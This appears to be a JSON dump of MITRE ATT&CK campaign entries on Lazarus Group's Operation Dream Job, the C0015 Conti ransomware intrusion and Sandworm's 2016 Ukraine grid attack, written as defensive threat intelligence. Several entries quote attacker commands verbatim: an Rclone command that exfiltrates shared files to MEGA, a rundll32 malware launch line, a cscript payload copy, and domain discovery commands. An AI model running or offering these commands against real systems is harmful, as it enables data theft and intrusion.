Information During C0021, the threat actors deobfuscated encoded PowerShell commands including use of the specific string 'FromBase'+0x40+'String', in place of FromBase64String which is normally used to decode base64.[2][1] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography During C0021, the threat actors used SSL via TCP port 443 for C2 communications.[2] Enterprise T1105 Ingress Tool Transfer During C0021, the threat actors downloaded additional tools and files onto victim machines.[1][2] Enterprise T1095 Non-Application Layer Protocol During C0021, the threat actors used TCP for some C2 communications.[2] Enterprise T1027 .009 Obfuscated Files or Information: Embedded Payloads For C0021, the threat actors embedded a base64-encoded payload within a LNK file.[1] .010 Obfuscated Files or Information: Command Obfuscation During C0021, the threat actors used encoded PowerShell commands.[2][1] Enterprise T1588 .002 Obtain Capabilities: Tool For C0021, the threat actors used Cobalt Strike configured with a modified variation of the publicly available Pandora Malleable C2 Profile.[2][1] Enterprise T1566 .002 Phishing: Spearphishing Link During C0021, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks.[2][1] Enterprise T1608 .001 Stage Capabilities: Upload Malware For C0021, the threat actors uploaded malware to websites under their control.[2][1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 During C0021, the threat actors used rundll32.exe to execute the Cobalt Strike Beacon loader DLL.[2] Enterprise T1204 .001 User Execution: Malicious Link During C0021, the threat actors lured users into clicking a malicious link which led to the download of a ZIP archive containing a malicious .LNK file.[2] Software ID Name Description S0154 Cobalt Strike [2][1] References Microsoft Defender Research Team. (2018, December 3). Analysis of cyberattack on U.S. think tanks, non-profits, public sector by unidentified attackers. Retrieved April 15, 2019. Dunwoody, M., et al. (2018, November 19). Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign. Retrieved November 27, 2018. "
},
{
"id": 1757,
"title": "Operation Dream Job, Operation North Star, Operation Interception, Campaign C0022",
"path": "/campaigns/C0022/index.html",
"content": " Operation Dream Job Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India. In at least one case, the cyber actors tried to monetize their network access to conduct a business email compromise (BEC) operation. In 2020, security researchers noted overlapping TTPs, to include fake job lures and code similarities, between Operation Dream Job, Operation North Star, and Operation Interception; by 2022 security researchers described Operation Dream Job as an umbrella term covering both Operation Interception and Operation North Star.[1][2][3][4] ID: C0022 First Seen: September 2019 [3] Last Seen: August 2020 [1] ⓘ Associated Campaigns: Operation North Star, Operation Interception Version: 1.0 Created: 17 March 2023 Last Modified: 10 April 2023 Version Permalink Live Version Associated Campaign Descriptions Name Description Operation North Star [2][5] Operation Interception [3] Groups ID Name Description G0032 Lazarus Group [1][2][5][3] Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account During Operation Dream Job, Lazarus Group queried compromised victim's active directory servers to obtain the list of employees including administrator accounts.[3] Enterprise T1583 .001 Acquire Infrastructure: Domains During Operation Dream Job, Lazarus Group registered a domain name identical to that of a compromised company as part of their BEC effort.[3] .004 Acquire Infrastructure: Server During Operation Dream Job, Lazarus Group acquired servers to host their malicious tools.[3] .006 Acquire Infrastructure: Web Services During Operation Dream Job, Lazarus Group used file hosting services like DropBox and OneDrive.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols During Operation Dream Job, Lazarus Group uses HTTP and HTTPS to contact actor-controlled C2 servers.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility During Operation Dream Job, Lazarus Group archived victim's data into a RAR file.[3] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence.[2] Enterprise T1110 Brute Force During Operation Dream Job, Lazarus Group performed brute force attacks against administrator accounts.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During Operation Dream Job, Lazarus Group used PowerShell commands to explore the environment of compromised victims.[3] .003 Command and Scripting Interpreter: Windows Command Shell During Operation Dream Job, Lazarus Group launched malicious DLL files, created new folders, and renamed folders with the use of the Windows command shell.[3][2] .005 Command and Scripting Interpreter: Visual Basic During Operation Dream Job, Lazarus Group executed a VBA written malicious macro after victims download malicious DOTM files; Lazarus Group also used Visual Basic macro code to extract a double Base64 encoded DLL implant.[1][2] Enterprise T1584 .001 Compromise Infrastructure: Domains For Operation Dream Job, Lazarus Group compromised domains in Italy and other countries for their C2 infrastructure.[2][5] .004 Compromise Infrastructure: Server For Operation Dream Job, Lazarus Group compromised servers to host their malicious tools.[1][3][2] Enterprise T1005 Data from Local System During Operation Dream Job, Lazarus Group used malicious Trojans and DLL files to exfiltrate data from an infected host.[1][2] Enterprise T1622 Debugger Evasion During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers.[1] Enterprise T1587 .001 Develop Capabilities: Malware For Operation Dream Job, Lazarus Group developed custom tools such as Sumarta, DBLL Dropper, Torisma, and DRATzarus for their operations.[1][3][2][5] .002 Develop Capabilities: Code Signing Certificates During Operation Dream Job, Lazarus Group digitally signed their malware and the dbxcli utility.[3] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography During Operation Dream Job, Lazarus Group used an AES key to communicate with their C2 server.[2] Enterprise T1585 .001 Establish Accounts: Social Media Accounts For Operation Dream Job, Lazarus Group created fake LinkedIn accounts for their targeting efforts.[1][3] .002 Establish Accounts: Email Accounts During Operation Dream Job, Lazarus Group created fake email accounts to correspond with fake LinkedIn personas; Lazarus Group also established email accounts to match those of the victim as part of their BEC attempt.[3] Enterprise T1041 Exfiltration Over C2 Channel During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox.[3][1] Enterprise T1083 File and Directory Discovery During Operation Dream Job, Lazarus Group conducted word searches within documents on a compromised host in search of security and financial matters.[1] Enterprise T1589 Gather Victim Identity Information For Operation Dream Job, Lazarus Group conducted extensive reconnaissance research on potential targets.[1] Enterprise T1591 Gather Victim Org Information For Operation Dream Job, Lazarus Group gathered victim organization information to identify specific targets.[1] .004 Identify Roles During Operation Dream Job, Lazarus Group targeted specific individuals within an organization with tailored job vacancy announcements.[1][3] Enterprise T1070 .004 Indicator Removal: File Deletion During Operation Dream Job, Lazarus Group removed all previously delivered files from a compromised computer.[3] Enterprise T1105 Ingress Tool Transfer During Operation Dream Job, Lazarus Group downloaded multistage malware and tools onto a compromised host.[1][3][2] Enterprise T1534 Internal Spearphishing During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.[1] Enterprise T1036 .008 Masquerading: Masquerade File Type During Operation Dream Job, Lazarus Group disguised malicious template files as JPEG files to avoid detection.[2][3] Enterprise T1106 Native API During Operation Dream Job, Lazarus Group used Windows API ObtainUserAgentString to obtain the victim's User-Agent and used the value to connect to their C2 server.[2] Enterprise T1027 Obfuscated Files or Information During Operation Dream Job, Lazarus Group encrypted malware such as DRATzarus with XOR and DLL files with base64.[1][3][2][5] .002 Software Packing During Operation Dream Job, Lazarus Group packed malicious .db files with Themida to evade detection.[1][2][5] Enterprise T1588 .002 Obtain Capabilities: Tool For Operation Dream Job, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli.[1][3] .003 Obtain Capabilities: Code Signing Certificates During Operation Dream Job, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools.[3] Enterprise T1566 .001 Phishing: Spearphishing Attachment During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers.[1][2] .002 Phishing: Spearphishing Link During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email.[1][3] .003 Phishing: Spearphishing via Service During Operation Dream Job, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs.[1][3] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task During Operation Dream Job, Lazarus Group created scheduled tasks to set a periodic execution of a remote XSL script.[3] Enterprise T1593 .001 Search Open Websites/Domains: Social Media For Operation Dream Job, Lazarus Group used LinkedIn to identify and target employees within a chosen organization.[3] Enterprise T1505 .004 Server Software Component: IIS Components During Operation Dream Job, Lazarus Group targeted Windows servers running Internet Information Systems (IIS) to install C2 components.[2] Enterprise T1608 .001 Stage Capabilities: Upload Malware For Operation Dream Job, Lazarus Group used compromised servers to host malware.[1][3][2][5] .002 Stage Capabilities: Upload Tool For Operation Dream Job, Lazarus Group used multiple servers to host malicious tools.[3] Enterprise T1553 .002 Subvert Trust Controls: Code Signing During Operation Dream Job, Lazarus Group digitally signed their own malware to evade detection.[3] Enterprise T1218 .010 System Binary Proxy Execution: Regsvr32 During Operation Dream Job, Lazarus Group used regsvr32 to execute malware.[3] .011 System Binary Proxy Execution: Rundll32 During Operation Dream Job, Lazarus Group executed malware with C:\\\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\", CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905.[1][3][2] Enterprise T1614 .001 System Location Discovery: System Language Discovery During Operation Dream Job, Lazarus Group deployed malware designed not to run on computers set to Korean, Japanese, or Chinese in Windows language preferences.[1] Enterprise T1221 Template Injection During Operation Dream Job, Lazarus Group used DOCX files to retrieve a malicious document template/DOTM file.[1][2] Enterprise T1204 .001 User Execution: Malicious Link During Operation Dream Job, Lazarus Group lured users into executing a malicious link to disclose private account information or provide initial access.[1][3] .002 User Execution: Malicious File During Operation Dream Job, Lazarus Group lured victims into executing malicious documents that contained \"dream job\" descriptions from defense, aerospace, and other sectors.[1][2] Enterprise T1497 .001 Virtualization/Sandbox Evasion: System Checks During Operation Dream Job, Lazarus Group used tools that conducted a variety of system checks to detect sandboxes or VMware services.[1] .003 Virtualization/Sandbox Evasion: Time Based Evasion During Operation Dream Job, Lazarus Group used tools that collected GetTickCount and GetSystemTimeAsFileTime data to detect sandbox or VMware services.[1] Enterprise T1047 Windows Management Instrumentation During Operation Dream Job, Lazarus Group used WMIC to executed a remote XSL script.[3] Enterprise T1220 XSL Script Processing During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.[3] Software ID Name Description S0694 DRATzarus During Operation Dream Job, Lazarus Group used DRATzarus to deploy open source software and partly commodity software such as Responder, Wake-On-Lan, and ChromePass to target infected hosts.[1] S0174 Responder [1] S0678 Torisma During Operation Dream Job, Lazarus Group used Torisma to actively monitor for new drives and remote desktop connections on an infected system.[2][5] References ClearSky Research Team. (2020, August 13). Operation 'Dream Job' Widespread North Korean Espionage Campaign. Retrieved December 20, 2021. Cashman, M. (2020, July 29). Operation North Star Campaign. Retrieved December 20, 2021. Breitenbacher, D and Osis, K. (2020, June 17). OPERATION IN(TER)CEPTION: Targeted Attacks Against European Aerospace and Military Companies. Retrieved December 20, 2021. Lakshmanan, R. (2022, August 17). North Korea Hackers Spotted Targeting Job Seekers with macOS Malware. Retrieved April 10, 2023. Beek, C. (2020, November 5). Operation North Star: Behind The Scenes. Retrieved December 20, 2021. "
},
{
"id": 1758,
"title": "C0015, Campaign C0015",
"path": "/campaigns/C0015/index.html",
"content": " C0015 C0015 was a ransomware intrusion during which the unidentified attackers used Bazar, Cobalt Strike, and Conti, along with other tools, over a 5 day period. Security researchers assessed the actors likely used the widely-circulated Conti ransomware playbook based on the observed pattern of activity and operator errors.[1] ID: C0015 First Seen: August 2021 [1] Last Seen: August 2021 [1] Contributors: Matt Brenton, Zurich Insurance Group Version: 1.0 Created: 29 September 2022 Last Modified: 29 September 2022 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell During C0015, the threat actors used cmd.exe to execute commands and run malicious binaries.[1] .005 Command and Scripting Interpreter: Visual Basic During C0015, the threat actors used a malicious HTA file that contained a mix of HTML and JavaScript/VBScript code.[1] .007 Command and Scripting Interpreter: JavaScript During C0015, the threat actors used a malicious HTA file that contained a mix of encoded HTML and JavaScript/VBScript code.[1] Enterprise T1486 Data Encrypted for Impact During C0015, the threat actors used Conti ransomware to encrypt a compromised network.[1] Enterprise T1005 Data from Local System During C0015, the threat actors obtained files and data from the compromised network.[1] Enterprise T1039 Data from Network Shared Drive During C0015, the threat actors collected files from network shared drives prior to network encryption.[1] Enterprise T1074 .001 Data Staged: Local Data Staging During C0015, PowerView's file share enumeration results were stored in the file c:\\ProgramData\\found_shares.txt.[1] Enterprise T1030 Data Transfer Size Limits During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration.[1] Enterprise T1482 Domain Trust Discovery During C0015, the threat actors used the command nltest /domain_trusts /all_trusts to enumerate domain trusts.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M.[1] Enterprise T1083 File and Directory Discovery During C0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.[1] Enterprise T1105 Ingress Tool Transfer During C0015, the threat actors downloaded additional tools and files onto a compromised network.[1] Enterprise T1570 Lateral Tool Transfer During C0015, the threat actors used WMI to load Cobalt Strike onto additional hosts within a compromised network.[1] Enterprise T1036 Masquerading During C0015, the threat actors named a binary file compareForfor.jpg to disguise it as a JPG file.[1] Enterprise T1135 Network Share Discovery During C0015, the threat actors executed the PowerView ShareFinder module to identify open shares.[1] Enterprise T1027 Obfuscated Files or Information During C0015, the threat actors used Base64-encoded strings.[1] Enterprise T1588 .001 Obtain Capabilities: Malware For C0015, the threat actors used Cobalt Strike and Conti ransomware.[1] .002 Obtain Capabilities: Tool For C0015, the threat actors obtained a variety of tools, including AdFind, AnyDesk, and Process Hacker.[1] Enterprise T1069 .001 Permission Groups Discovery: Local Groups During C0015, the threat actors used the command net localgroup \"adminstrator\" to identify accounts with local administrator rights.[1] .002 Permission Groups Discovery: Domain Groups During C0015, the threat actors use the command net group \"domain admins\" /dom to enumerate domain groups.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment For C0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.[1] Enterprise T1057 Process Discovery During C0015, the threat actors used the tasklist /s command as well as taskmanager to obtain a list of running processes.[1] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection During C0015, the threat actors used a DLL named D8B3.dll that was injected into the Winlogon process.[1] Enterprise T1219 Remote Access Software During C0015, the threat actors installed the AnyDesk remote desktop application onto the compromised network.[1] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol During C0015, the threat actors used RDP to access specific network hosts of interest.[1] Enterprise T1018 Remote System Discovery During C0015, the threat actors used the commands net view /all /domain and ping to discover remote systems. They also used PowerView's PowerShell Invoke-ShareFinder script for file share enumeration.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing For C0015, the threat actors used DLL files that had invalid certificates.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta During C0015, the threat actors used mshta to execute DLLs.[1] .010 System Binary Proxy Execution: Regsvr32 During C0015, the threat actors employed code that used regsvr32 for execution.[1] .011 System Binary Proxy Execution: Rundll32 During C0015, the threat actors loaded DLLs via rundll32 using the svchost process.[1] Enterprise T1016 System Network Configuration Discovery During C0015, the threat actors used code to obtain the external public-facing IPv4 address of the compromised host.[1] Enterprise T1124 System Time Discovery During C0015, the threat actors used the command net view /all time to gather the local time of a compromised network.[1] Enterprise T1204 .002 User Execution: Malicious File During C0015, the threat actors relied on users to enable macros within a malicious Microsoft Word document.[1] Enterprise T1047 Windows Management Instrumentation During C0015, the threat actors used wmic and rundll32 to load Cobalt Strike onto a target host.[1] Software ID Name Description S0552 AdFind [1] S0534 Bazar [1] S0154 Cobalt Strike [1] S0575 Conti [1] S1040 Rclone [1] References DFIR Report. (2021, November 29). CONTInuing the Bazar Ransomware Story. Retrieved September 29, 2022. "
},
{
"id": 1759,
"title": "2016 Ukraine Electric Power Attack, Campaign C0025",
"path": "/campaigns/C0025/index.html",
"content": " 2016 Ukraine Electric Power Attack 2016 Ukraine Electric Power Attack was a Sandworm Team campaign during which they used Industroyer malware to target and disrupt distribution substations within the Ukrainian power grid. This campaign was the second major public attack conducted against Ukraine by Sandworm Team.[1][2] ID: C0025 First Seen: December 2016 [1][2] Last Seen: December 2016 [1][2] Version: 1.0 Created: 31 March 2023 Last Modified: 10 April 2023 Version Permalink Live Version Groups ID Name Description G0034 Sandworm Team [3][4] Techniques Used Domain ID Name Use Enterprise T1098 Account Manipulation During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.[2] Enterprise T1110 Brute Force During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[2] .003 Command and Scripting Interpreter: Windows Command Shell During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL.[2] .005 Command and Scripting Interpreter: Visual Basic During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server.[2] Enterprise T1554 Compromise Client Software Binary During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer.[1] Enterprise T1136 Create Account During the 2016 Ukraine Electric Power Attack, Sandworm Team added a login to a SQL Server with sp_addlinkedsrvlogin.[2] .002 Domain Account During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"система\" (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.[2] Enterprise T1543 .003 Create or Modify System Process: Windows Service During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. [5] Enterprise T1562 .002 Impair Defenses: Disable Windows Event Logging During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems.[2] Enterprise T1570 Lateral Tool Transfer During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Name or Location During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.[5] .008 Masquerading: Masquerade File Type During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files.[2] Enterprise T1027 Obfuscated Files or Information During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.[1] .002 Software Packing During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz.[2] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials.[2] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares.[2] Enterprise T1018 Remote System Discovery During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.[2] Enterprise T1505 .001 Server Software Component: SQL Stored Procedures During the 2016 Ukraine Electric Power Attack, Sandworm Team used various MS-SQL stored procedures.[2] Enterprise T1047 Windows Management Instrumentation During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. [2] ICS T0807 Command-Line Interface During the 2016 Ukraine Electric Power Attack, Sandworm Team supplied the name of the payload DLL to Industroyer via a command line parameter.[1] ICS T0867 Lateral Tool Transfer During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:\\Backinfo\\ufn.vbs C:\\Backinfo\\101.dll C:\\Delta\\101.dll[2] ICS T0849 Masquerading During the 2016 Ukraine Electric Power Attack, Sandworm Team transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking.[2] ICS T0886 Remote Services During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network.[2] ICS T0853 Scripting During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.[2] ICS T0859 Valid Accounts During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems.[2] Software ID Name Description S0604 Industroyer Within the 2016 Ukraine Electric Power Attack, Industroyer was used to target and disrupt the Ukrainian power grid substation components.[2][1] References Anton Cherepanov. (2017, June 12). Win32/Industroyer: A new threat for industrial controls systems. Retrieved December 18, 2020. Joe Slowik. (2018, October 12). Anatomy of an Attack: Detecting and Defeating CRASHOVERRIDE. Retrieved December 18, 2020. Scott W. Brady. (2020, October 15). United States vs. Yuriy Sergeyevich Andrienko et al.. Retrieved November 25, 2020. Joe Slowik 2019, August 15 CRASHOVERRIDE: Reassessing the 2016 Ukraine Electric Power Event as a Protection-Focused Attack Retrieved. 2019/10/22 Dragos Inc.. (2017, June 13). CRASHOVERRIDE Analysis of the Threat to Electric Grid Operations. Retrieved December 18, 2020. "
}
]